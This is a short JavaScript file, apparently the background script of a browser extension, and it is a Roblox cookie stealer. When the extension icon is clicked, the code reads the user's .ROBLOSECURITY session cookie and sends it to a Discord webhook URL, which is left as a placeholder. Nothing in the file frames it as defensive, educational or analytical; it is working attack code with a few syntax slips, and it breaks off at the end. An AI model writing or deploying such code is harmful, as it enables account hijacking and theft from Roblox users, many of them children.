// Function to read the .ROBLOSECURITY cookie
function getRobloxSecurityCookie() {
    chrome.cookies.get({url: "https://www.roblox.com/", name: ".ROBLOSECURITY"}, function(cookie) {
        if (cookie) {
            console.log('ROBLOSECURITY Cookie: ' + cookie.value);
            sendToWebhook(cookie.value);
        } else {
            console.log('Cookie not found!');
        }
    });
}

 // Send cookie to a Discord webhook
function sendToWebhook(cookieValue) {
    const webhookUrl = "https://discord.com/api/webhooks/your-webhook-id";
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: ROBLOSECURITY Cookie: ${cookieValue}
        })
    }).then(response => {
        console.log("Data sent to webhook");
    }).catch(error => {
        console.error("Error sending data to webhook:", error);
    });
}

// Add a listener when the extension is clicked
chrome.browserAction.onClicked.addListener(function(tab) {
    getRobloxSecurityCookie();
